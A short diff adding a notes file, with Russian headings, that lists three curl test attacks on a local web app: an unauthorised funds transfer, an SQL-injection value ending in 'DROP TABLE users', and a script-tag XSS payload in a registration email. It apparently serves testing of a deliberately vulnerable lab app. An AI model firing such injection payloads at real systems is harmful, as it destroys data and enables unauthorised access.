@@ -1,0 +1,15 @@
+Атака: Перевод средств без проверки прав
+curl -X POST http://localhost:8000/transfer \
+     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxxx" \
+     -d '{"target_email": "hacker@example.com", "amount": 100}'
+
+SQLi
+curl -X POST http://localhost:8000/transfer \
+     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxxx" \
+     -d '{"target_email": "hacker@example.com OR 1=1; DROP TABLE users; --", "amount": 100}'
+
+XSS
+curl -X POST http://localhost:8000/register \
+     -d '{"email": "<script>alert(1)</script>@example.com", "password": "123"}'
+
+
